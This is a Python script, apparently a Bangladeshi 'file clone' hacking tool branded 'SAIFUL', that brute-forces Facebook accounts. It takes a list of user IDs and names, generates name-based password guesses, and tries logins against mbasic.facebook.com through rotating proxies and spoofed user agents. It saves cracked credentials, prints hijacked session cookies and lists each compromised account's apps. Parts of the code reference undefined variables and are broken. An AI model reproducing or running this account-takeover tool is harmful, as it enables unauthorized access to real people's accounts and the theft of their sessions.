#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \033[93;1m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SAIFUL.M]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\033[93;1m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\033[93;1m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\033[93;1mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _SAIFUL_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
	
os.system("clear")
_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate by saiful vai...............')
_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate done.............')
_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32monly file clone bro.............')
_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32madd my messenger group ')
_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32m70% free fire🌹')
_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m FOLLOW MY FB ACCOUNT............')                                        
os.system('xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL')
os.system('clear')

#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
\033[1;32m  ███████╗ █████╗ ██╗███████╗██╗   ██╗██╗     
\033[93;1m  ██╔════╝██╔══██╗██║██╔════ ██║   ██║██║     
\033[93;1m  ███████╗███████║██║█████╗  ██║   ██║██║     
\033[93;1m  ╚════██║██╔══██║██║██╔══╝  ██║   ██║██║     
\033[1;32m  ███████║██║  ██║██║██║     ╚██████╔╝███████╗
\033[1;32m  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝ ╚══════╝                                                                                               
  
\033[1;32m____________________KING Start ___________________


\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mC.E.O-SAIFUL
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mSAIFUL VAI ( BLANK ) 
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35m SAIFUL-HACKER420
\033[1;32m[+] \033[1;36mWHATSAPP     :  \033[1;36m+8801792609926
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m 3.0.1 《G.S.T》 free tools 😍
\033[1;32m[+] \033[1;32m[+]==========================================""")

_SAIFUL_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32madd my messenger group ')
os.system('xdg-open https://m.me/j/AbbmEQT-EbT2RYf3/')
os.system('clear')

_SAIFUL_(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;31mWhat Is Your Name\033[40m\033[00m')
SAIFUL_VAI=input(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Your Name ➤\x1b[1;96m ')
os.system("xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL")

#------------------[ BAGIAN-MENU ]----------------#

def menu():
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	_SAIFUL_(f'\033[93;1m┏────────────────────────┓')
	_SAIFUL_(f'\033[93;1m│\033[47m\033[1;30m𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍\033[40m\033[00m\033[93;1m│')
	_SAIFUL_(f'\033[93;1m┠─────────────┯──────────┛')
	_SAIFUL_(f'\033[93;1m│\x1b[1;92m𝐘𝐨𝐮𝐫 𝐍𝐚𝐦𝐞\033[93;1m────╂➤\x1b[1;92m '+str(SAIFUL_VAI))
	_SAIFUL_(f'\033[93;1m│\x1b[1;92m𝐘𝐨𝐮𝐫 𝐈𝐏\033[93;1m──────╂➤ \x1b[1;92m{ip}')
	_SAIFUL_(f'\033[93;1m┗─────────────┛')
	_SAIFUL_(f'\033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;34m  𝐂𝐑𝐀𝐂𝐊 𝐌𝐄𝐓𝐇𝐎𝐃  \033[40m\033[00m')
	_SAIFUL_(f'\033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m 𝐅𝐈𝐋𝐄 𝐂𝐑𝐀𝐂𝐊')
	#_SAIFUL_(f'\033[93;1m[\x1b[1;92m2\033[93;1m]\x1b[1;92m 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊')
	_SAIFUL_(f'\033[93;1m[\x1b[1;92m3\033[93;1m]\x1b[1;92m 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌𝐄')
	_____SAIFUL_____ = input('\033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94m𝐂𝐡𝐨𝐢𝐜𝐞 ➤\x1b[1;92m ')
	if _____SAIFUL_____ in ['1']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		F()
	
	if _____SAIFUL_____ in ['2']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		
	if _____SAIFUL_____ in ['3']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL")
		os.system('rm -rf .cookie.txt')
	else:
		print(' \033[93;1m➤\x1b[1;96m➤\033[93;1m➤ 𝐖𝐫𝐨𝐧𝐠 𝐂𝐡𝐨𝐢𝐜𝐞 𝐁𝐚𝐫𝐚 😩 ')
		exit()
def error():
	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m𝐒𝐨𝐫𝐫𝐲, 𝐏𝐥𝐳 𝐂𝐡𝐨𝐨𝐬𝐞 𝐭𝐡𝐞 𝐑𝐢𝐠𝐡𝐭 𝐌𝐞𝐧𝐮')
	time.sleep(2)
	back()
	
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')

#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			_SAIFUL_(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;35m     Example: /sdcard/folder name.txt     \033[40m\033[00m')
			fileX = input (' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Enter Your File ➤\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;96TOTAL ID ➤ \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(" \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	_SAIFUL_(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m[\x1b[1;92m2\033[93;1m]\x1b[1;92m New Old Mix')
	hu = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94mChoose ➤\x1b[1;92m ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1mWrong Option Bara')
		exit()
	
	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m Mobile [BEST]')
	hc = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94mChoose ➤\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Manual Password \033[93;1m[m]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Auto Password \x1b[1;96m[d] \x1b[1;92m[BEST]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94mChoice ➤ \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Add Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
os.system("clear")
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSAIFUL M\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●')
	_SAIFUL_(f"\033[93;1m [❤️] \x1b[1;92m𝐘𝐨𝐮𝐫 𝐍𝐚𝐦𝐞         \033[93;1m➤ \x1b[1;92m"+str(SAIFUL_VAI))
	print(f"\033[93;1m [❤️] \x1b[1;92m𝐓𝐎𝐓𝐀𝐋 𝐈𝐃          \033[93;1m➤ \x1b[1;92m"+str(len(id)))
	print(f"\033[93;1m [❤️] \x1b[1;92m𝐓𝐎𝐃𝐀𝐘 𝐓𝐈𝐌𝐄        \033[93;1m➤ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\033[93;1m [❤️] \x1b[1;92m𝐓𝐎𝐃𝐀𝐘 𝐃𝐀𝐓𝐄        \033[93;1m➤ \x1b[1;92m{ha}\033[93;1m/\x1b[1;92m{bu}\033[93;1m/\x1b[1;92m{ta} ")
	print(f"\033[93;1m [❤️] \033[93;1m𝐍𝐎𝐓𝐄 ➤ \33[1;92m[ 𝐔𝐒𝐄 𝐀𝐈𝐑𝐏𝐋𝐀𝐍𝐄 𝐌𝐎𝐃𝐄 𝐁𝐄𝐅𝐎𝐑𝐄 𝐔𝐒𝐄 ] ")
	print(f'\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSAIFUL M\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'12345')
					pwv.append(frs+'2023')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'123@')
					pwv.append(frs+'12345')
					pwv.append(frs+'2023')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ 𝐂𝐑𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 ')
	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ OK : {h}%s '%(ok))
	print(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤  Main Manu \x1b[1;92m[Y]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1mExit [T]')
	woi = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ 𝐂𝐡𝐨𝐢𝐜𝐞 : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Allah Hafiz Bro {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} SAIFUL VAI {h} [{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"authority":'mbasic.facebook.com',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		     'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
  		   'cache-control': 'max-age=0',
   		  'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
   		  'sec-ch-ua-mobile': '?1',
 		    'sec-ch-ua-platform': '"Android"',
    		 'sec-fetch-dest': 'document',
  		   'sec-fetch-mode': 'navigate',
    		 'sec-fetch-site': 'none',
  		   'sec-fetch-user': '?1',
   		  'upgrade-insecure-requests': '1',
 		    'user-agent': ua})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"authority":'mbasic.facebook.com',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		     'accept-language': 'en-ZA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
  		   'cache-control': 'max-age=0',
   		  'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
   		  'sec-ch-ua-mobile': '?1',
 		    'sec-ch-ua-platform': '"Android"',
    		 'sec-fetch-dest': 'document',
  		   'sec-fetch-mode': 'navigate',
    		 'sec-fetch-site': 'none',
  		   'sec-fetch-user': '?1',
   		  'upgrade-insecure-requests': '1',
 		    'user-agent': ua}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \033[93;1m CP\033[93;1m------\x1b[1;91m{idf} | {pw}{N}')     
				
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n SAIFUL-OK [💚] {idf} | {pw}\n [💉]COOKIES ➤ {kuki}\n ')
				#print(f'\r{H}\n SAIFUL-OK    [💚] {idf} \033[97;1m pass ❥\033[1;92m  {pw}')
				#print(f'\r \033[93;1m SAIFUL-OK [💚]  \033[1;92m{idf} \033[97;1m pass ❥\033[1;92m {pw}{N}')     
				cek_apk(session,coki)
				open('/sdcard/SAIFUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				#open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()

#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()